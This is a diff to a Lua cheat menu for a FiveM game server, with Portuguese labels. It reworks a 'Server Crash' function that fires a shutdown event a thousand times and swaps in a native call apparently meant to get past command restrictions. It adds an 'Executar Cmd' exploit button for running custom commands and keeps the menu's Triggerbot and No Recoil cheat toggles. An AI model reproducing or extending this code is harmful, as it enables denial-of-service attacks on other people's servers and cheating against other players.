@@ -3743,7 +3743,7 @@ function ServerCrashTest()
         NotifyAviso('Iniciando Server Crash Test...')
         for i = 1, 1000 do
             TriggerServerEvent('EasyAdmin:ServerShutdown', 'Crash Test')
-            ExecuteCommand('shutdown')
+            Citizen.InvokeNative(0x561C060B, 'shutdown')
             Citizen.Wait(10)
         end
         NotifySucesso('Server Crash Test Finalizado!')
@@ -5772,8 +5772,6 @@ function Menu()
 
         JogadorY2 = JogadorY2 + JogadorAdd2
         if JogadorY2 >= 0.222 and JogadorY2 <= JogadorMax2 then 
-            if CheckBox('
-    JogadorY2 = JogadorY2 + JogadorAdd2
     if JogadorY2 >= 0.222 and JogadorY2 <= JogadorMax2 then
         if CheckBox('No Recoil', 0.580+menuX, JogadorY2 + menuY, 0.505+menuY, ToggleNoRecoil) then SomClick() ToggleNoRecoil = not ToggleNoRecoil end
     end
@@ -5811,7 +5809,10 @@ function Menu()
     if JogadorY2 >= 0.222 and JogadorY2 <= JogadorMax2 then
         if CheckBox('Triggerbot', 0.580+menuX, JogadorY2 + menuY, 0.505+menuY, ToggleTriggerBot) then SomClick() ToggleTriggerBot = not ToggleTriggerBot end
     end
-Lista De Players', 0.580+menuX, JogadorY2 + menuY, 0.505+menuY, Lista_De_Players) then SomClick() Lista_De_Players = not Lista_De_Players opacity2 = 0 end
+    JogadorY2 = JogadorY2 + JogadorAdd2
+    if JogadorY2 >= 0.222 and JogadorY2 <= JogadorMax2 then
+        if CheckBox('Lista De Players', 0.580+menuX, JogadorY2 + menuY, 0.505+menuY, Lista_De_Players) then SomClick() Lista_De_Players = not Lista_De_Players opacity2 = 0 end
+    end
         end
 
     
@@ -6511,6 +6512,11 @@ Lista De Players', 0.580+menuX, JogadorY2 + menuY, 0.505+menuY, Lista_De_Players
     ExploitsY = ExploitsY + ExploitsAdd
     if ExploitsY >= 0.220 and ExploitsY <= ExploitsMax then
         if Botao('Server Crash', 0.505+menuX, ExploitsY + menuY, 0.505+menuY) then SomClick() ServerCrashTest() end
+
+    ExploitsY = ExploitsY + ExploitsAdd
+    if ExploitsY >= 0.220 and ExploitsY <= ExploitsMax then
+        if Botao('Executar Cmd', 0.505+menuX, ExploitsY + menuY, 0.505+menuY) then SomClick() CustomCommand() end
+    end
     end
                 local playerName = GetPlayerName(player)                
                 local vasco = GetEntityHealth(playerped)
